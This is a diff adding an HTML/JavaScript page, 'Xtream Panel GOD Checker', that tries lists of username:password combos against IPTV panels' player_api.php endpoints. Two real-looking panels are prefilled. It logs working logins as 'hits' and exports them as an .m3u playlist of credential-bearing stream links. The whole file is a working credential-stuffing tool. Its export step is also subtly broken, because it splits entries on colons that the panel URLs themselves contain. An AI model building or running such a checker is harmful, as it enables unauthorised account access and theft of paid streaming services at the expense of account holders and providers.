@@ -1,0 +1,126 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Xtream GOD Checker</title>
+  <style>
+    body {
+      background-color: black;
+      color: #33ff33;
+      font-family: monospace;
+      padding: 20px;
+      overflow-x: hidden;
+    }
+    h1 {
+      color: #00ff00;
+    }
+    textarea, input {
+      width: 100%;
+      background: #111;
+      color: #0f0;
+      border: 1px solid #0f0;
+      padding: 10px;
+      margin-bottom: 10px;
+    }
+    button {
+      padding: 10px;
+      margin: 5px;
+      background: #222;
+      color: #0f0;
+      border: 1px solid #0f0;
+      cursor: pointer;
+    }
+    #log {
+      height: 200px;
+      overflow-y: auto;
+      background: #000;
+      border: 1px solid #0f0;
+      padding: 10px;
+      margin-top: 10px;
+    }
+    #stats {
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Xtream Panel GOD Checker</h1>
+  <p>Enter Xtream panel URLs (one per line):</p>
+  <textarea id="panels" rows="5">http://xott.live:80\nhttp://tigerott.com:8080</textarea>  <p>Enter combos (user:pass, one per line):</p>
+  <textarea id="combos" rows="5">demo:demo</textarea><button onclick="startCheck()">Start GOD Scan</button> <button onclick="exportM3U()">Export .m3u</button>
+
+  <div id="stats">
+    <p>Hits: <span id="hitsCount">0</span> | Checked: <span id="checkedCount">0</span> | Errors: <span id="errorCount">0</span></p>
+  </div>
+  <div id="log"></div>  <script>
+    const logBox = document.getElementById("log");
+    let hits = [];
+    let stats = { hits: 0, checked: 0, errors: 0 };
+
+    function log(message) {
+      const line = document.createElement("div");
+      line.textContent = message;
+      logBox.appendChild(line);
+      logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    function updateStats() {
+      document.getElementById("hitsCount").textContent = stats.hits;
+      document.getElementById("checkedCount").textContent = stats.checked;
+      document.getElementById("errorCount").textContent = stats.errors;
+    }
+
+    async function checkCombo(panel, user, pass) {
+      const url = `${panel}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+      try {
+        const res = await fetch(url);
+        const json = await res.json();
+        stats.checked++;
+        if (json.user_info && json.user_info.auth == 1) {
+          const hit = `${panel}:${user}:${pass}`;
+          hits.push(hit);
+          localStorage.setItem("xtream_hits", JSON.stringify(hits));
+          stats.hits++;
+          log("[+] HIT: " + hit);
+        } else {
+          log("[-] Dead: " + user + ":" + pass + " @ " + panel);
+        }
+      } catch (err) {
+        stats.errors++;
+        log("[!] ERROR: " + user + ":" + pass + " @ " + panel);
+      }
+      updateStats();
+    }
+
+    async function startCheck() {
+      stats = { hits: 0, checked: 0, errors: 0 };
+      hits = [];
+      updateStats();
+      logBox.innerHTML = "";
+
+      const panels = document.getElementById("panels").value.trim().split(/\n+/);
+      const combos = document.getElementById("combos").value.trim().split(/\n+/);
+
+      for (const panel of panels) {
+        for (const combo of combos) {
+          if (!combo.includes(":")) continue;
+          const [user, pass] = combo.split(":");
+          await checkCombo(panel.trim(), user.trim(), pass.trim());
+        }
+      }
+    }
+
+    function exportM3U() {
+      const m3u = hits.map(hit => {
+        const [panel, user, pass] = hit.split(":");
+        return `#EXTINF:-1,${user}\n${panel}/live/${user}/${pass}/1.ts`;
+      }).join("\n");
+
+      const blob = new Blob([m3u], { type: 'text/plain' });
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = "hits.m3u";
+      a.click();
+    }
+  </script></body>
+</html>
